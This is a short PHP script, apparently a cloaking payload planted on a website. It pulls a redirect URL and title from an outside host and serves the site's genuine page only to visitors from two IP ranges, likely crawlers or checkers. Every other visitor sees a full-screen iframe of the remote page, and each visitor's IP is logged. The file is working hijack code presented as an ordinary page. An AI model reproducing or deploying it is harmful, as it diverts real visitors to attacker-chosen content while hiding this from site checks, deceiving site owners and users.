<?php
$domain=$_SERVER['SERVER_NAME'];
$body=file_get_contents("http://".$domain);
$url=file_get_contents("http://5210.ru/red.txt");
$title=file_get_contents("http://5210.ru/title.txt");
$ip=$_SERVER["REMOTE_ADDR"];

echo '<html><meta http-equiv="Content-Type" content="text/html;charset=UTF-8">';

	if(strstr($ip, "217.69.132") OR strstr($ip, "216.163.188") OR strstr($test, "test"))
		{
		echo  $body;
		}

	else
		{
		echo  '<head>
		<title>'.$title.'</title>
		<style>
		#ifr {
			position: absolute;
			top: 0;
			left: 0;
			border: 0;
			height: 100%;

			width: 100%; /*абы какое*/
			background-color: white; 
		}
		</style>
		</head>
		<body>
		<iframe id="ifr" src="'.$url.'"></iframe>
		</body>
		</html>';
		}

file_put_contents("log", $ip." - ".date('h:i:s')."\r\n", FILE_APPEND);